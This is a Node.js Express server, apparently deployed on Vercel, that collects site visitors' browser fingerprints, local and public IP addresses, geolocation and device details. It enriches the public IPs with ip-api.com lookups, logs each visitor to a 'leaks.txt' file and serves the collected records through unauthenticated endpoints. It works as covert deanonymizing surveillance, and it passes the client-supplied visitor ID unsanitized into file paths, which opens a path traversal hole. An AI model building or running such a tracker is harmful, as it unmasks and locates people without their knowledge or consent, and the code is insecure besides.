const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');

const app = express();

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Ensure data directory exists
const ensureDataDir = async (visitorId) => {
    const dataDir = path.join(process.cwd(), 'data', visitorId);
    try {
        await fs.mkdir(dataDir, { recursive: true });
    } catch (error) {
        console.error('Error creating data directory:', error);
    }
    return dataDir;
};

// POST /api/track - Main tracking endpoint
app.post('/track', async (req, res) => {
    try {
        const data = req.body;

        if (!data) {
            return res.status(400).json({ error: 'No data received' });
        }

        const timestamp = new Date().toISOString();
        const visitorId = data.fingerprintJS?.visitorId || 'unknown';

        // Ensure data directory exists
        const dataDir = await ensureDataDir(visitorId);

        // Save main visit data
        const mainLog = {
            timestamp,
            visitor_id: visitorId,
            fingerprint_confidence: data.fingerprintJS?.confidence || 0,
            user_agent: data.userAgent || '',
            platform: data.platform || '',
            language: data.language || '',
            timezone: data.timezone || '',
            screen_resolution: data.screenResolution || '',
            local_ips: data.localIPs || [],
            public_ips: data.publicIPs || [],
            location: data.location || null,
            hardware_concurrency: data.hardwareConcurrency || null,
            device_memory: data.deviceMemory || null,
            connection: data.connection || null,
            touch_support: data.touchSupport || false,
            max_touch_points: data.maxTouchPoints || 0,
            referrer: data.referrer || '',
            url: data.url || ''
        };

        // Save visits.json
        const visitsFile = path.join(dataDir, 'visits.json');
        let existingVisits = [];
        try {
            const visitsData = await fs.readFile(visitsFile, 'utf8');
            existingVisits = JSON.parse(visitsData);
        } catch (error) {
            // File doesn't exist or is invalid, start with empty array
        }
        existingVisits.push(mainLog);
        await fs.writeFile(visitsFile, JSON.stringify(existingVisits, null, 2));

        // Save fingerprints.json
        const fingerprints = {
            timestamp,
            fingerprintjs_components: data.fingerprintJS?.components || [],
            canvas_fingerprint: data.canvasFingerprint || '',
            webgl_fingerprint: data.webglFingerprint || [],
            audio_fingerprint: data.audioFingerprint || '',
            plugins: data.plugins || [],
            battery: data.battery || null
        };

        const fpFile = path.join(dataDir, 'fingerprints.json');
        let existingFps = [];
        try {
            const fpData = await fs.readFile(fpFile, 'utf8');
            existingFps = JSON.parse(fpData);
        } catch (error) {
            // File doesn't exist or is invalid
        }
        existingFps.push(fingerprints);
        await fs.writeFile(fpFile, JSON.stringify(existingFps, null, 2));

        // Save GeoIP data for public IPs
        if (data.publicIPs && data.publicIPs.length > 0) {
            for (const ip of data.publicIPs) {
                const geoFile = path.join(dataDir, `geo_${ip}.json`);
                try {
                    // Check if geo data already exists
                    await fs.access(geoFile);
                } catch (error) {
                    // File doesn't exist, fetch geo data
                    try {
                        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
                        if (geoResponse.ok) {
                            const geo = await geoResponse.json();
                            if (geo.status === 'success') {
                                const geoData = {
                                    ip,
                                    country: geo.country || '',
                                    countryCode: geo.countryCode || '',
                                    region: geo.region || '',
                                    regionName: geo.regionName || '',
                                    city: geo.city || '',
                                    zip: geo.zip || '',
                                    lat: geo.lat || '',
                                    lon: geo.lon || '',
                                    timezone: geo.timezone || '',
                                    isp: geo.isp || '',
                                    org: geo.org || '',
                                    as: geo.as || '',
                                    query: geo.query || '',
                                    fetched_at: timestamp
                                };
                                await fs.writeFile(geoFile, JSON.stringify(geoData, null, 2));
                            }
                        }
                    } catch (geoError) {
                        console.error('Error fetching geo data:', geoError);
                    }
                }
            }
        }

        // Save summary log
        const summary = `[${timestamp}] Visitor: ${visitorId} | IPs: ${[...(data.localIPs || []), ...(data.publicIPs || [])].join(', ')} | UA: ${(data.userAgent || '').substring(0, 100)} | Location: ${data.location?.latitude || 'N/A'},${data.location?.longitude || 'N/A'} | Device: ${data.platform || 'Unknown'}\n`;

        const leaksFile = path.join(process.cwd(), 'leaks.txt');
        try {
            await fs.appendFile(leaksFile, summary);
        } catch (error) {
            console.error('Error writing to leaks.txt:', error);
        }

        res.json({
            status: 'success',
            visitor_id: visitorId,
            message: 'Data collected successfully'
        });

    } catch (error) {
        console.error('Error processing tracking data:', error);
        res.status(500).json({
            status: 'error',
            message: 'Internal server error'
        });
    }
});

// GET /api/visitors - List all visitors
app.get('/visitors', async (req, res) => {
    try {
        const dataDir = path.join(process.cwd(), 'data');

        try {
            await fs.access(dataDir);
        } catch (error) {
            return res.json({ visitors: [] });
        }

        const visitorDirs = await fs.readdir(dataDir);
        const visitors = [];

        for (const visitorDirName of visitorDirs) {
            const visitorPath = path.join(dataDir, visitorDirName);
            const stat = await fs.stat(visitorPath);

            if (stat.isDirectory()) {
                const visitsFile = path.join(visitorPath, 'visits.json');
                try {
                    const visitsData = await fs.readFile(visitsFile, 'utf8');
                    const visits = JSON.parse(visitsData);

                    if (visits.length > 0) {
                        const latestVisit = visits[visits.length - 1];
                        latestVisit.visitor_id = visitorDirName;
                        visitors.push(latestVisit);
                    }
                } catch (error) {
                    console.error(`Error reading visits for ${visitorDirName}:`, error);
                }
            }
        }

        // Sort by timestamp (newest first)
        visitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

        res.json({ visitors });
    } catch (error) {
        console.error('Error listing visitors:', error);
        res.status(500).json({ error: 'Failed to list visitors' });
    }
});

// GET /api/visitor/:id - Get visitor details
app.get('/visitor/:id', async (req, res) => {
    try {
        const visitorId = req.params.id;
        const dataDir = await ensureDataDir(visitorId);
        const data = { visitor_id: visitorId };

        // Get visits
        const visitsFile = path.join(dataDir, 'visits.json');
        try {
            const visitsData = await fs.readFile(visitsFile, 'utf8');
            data.visits = JSON.parse(visitsData);
        } catch (error) {
            data.visits = [];
        }

        // Get fingerprints
        const fpFile = path.join(dataDir, 'fingerprints.json');
        try {
            const fpData = await fs.readFile(fpFile, 'utf8');
            data.fingerprints = JSON.parse(fpData);
        } catch (error) {
            data.fingerprints = [];
        }

        // Get geo data
        const geoFiles = await fs.readdir(dataDir);
        data.geo_data = {};
        for (const file of geoFiles) {
            if (file.startsWith('geo_') && file.endsWith('.json')) {
                const ip = file.replace('geo_', '').replace('.json', '');
                try {
                    const geoData = await fs.readFile(path.join(dataDir, file), 'utf8');
                    data.geo_data[ip] = JSON.parse(geoData);
                } catch (error) {
                    console.error(`Error reading geo data for ${ip}:`, error);
                }
            }
        }

        res.json(data);
    } catch (error) {
        console.error('Error getting visitor data:', error);
        res.status(500).json({ error: 'Failed to get visitor data' });
    }
});

// GET /api/stats - Get statistics
app.get('/stats', async (req, res) => {
    try {
        const dataDir = path.join(process.cwd(), 'data');
        const stats = {
            total_visitors: 0,
            unique_devices: 0,
            today_visits: 0,
            avg_confidence: 0
        };

        try {
            await fs.access(dataDir);
            const visitorDirs = await fs.readdir(dataDir);
            let totalConfidence = 0;
            let confidenceCount = 0;
            const today = new Date().toISOString().split('T')[0];

            for (const visitorDirName of visitorDirs) {
                const visitorPath = path.join(dataDir, visitorDirName);
                const stat = await fs.stat(visitorPath);

                if (stat.isDirectory()) {
                    stats.total_visitors++;
                    const visitsFile = path.join(visitorPath, 'visits.json');

                    try {
                        const visitsData = await fs.readFile(visitsFile, 'utf8');
                        const visits = JSON.parse(visitsData);

                        for (const visit of visits) {
                            if (visit.fingerprint_confidence) {
                                totalConfidence += visit.fingerprint_confidence;
                                confidenceCount++;
                            }

                            // Count today's visits
                            if (visit.timestamp.startsWith(today)) {
                                stats.today_visits++;
                            }
                        }
                    } catch (error) {
                        console.error(`Error reading stats for ${visitorDirName}:`, error);
                    }
                }
            }

            stats.unique_devices = stats.total_visitors;
            stats.avg_confidence = confidenceCount > 0 ? (totalConfidence / confidenceCount) * 100 : 0;

        } catch (error) {
            // Data directory doesn't exist
        }

        res.json(stats);
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ error: 'Failed to get statistics' });
    }
});

// Export for Vercel
module.exports = app;

// For local development
if (require.main === module) {
    const port = process.env.PORT || 3000;
    app.listen(port, () => {
        console.log(`Server running on port ${port}`);
    });
}
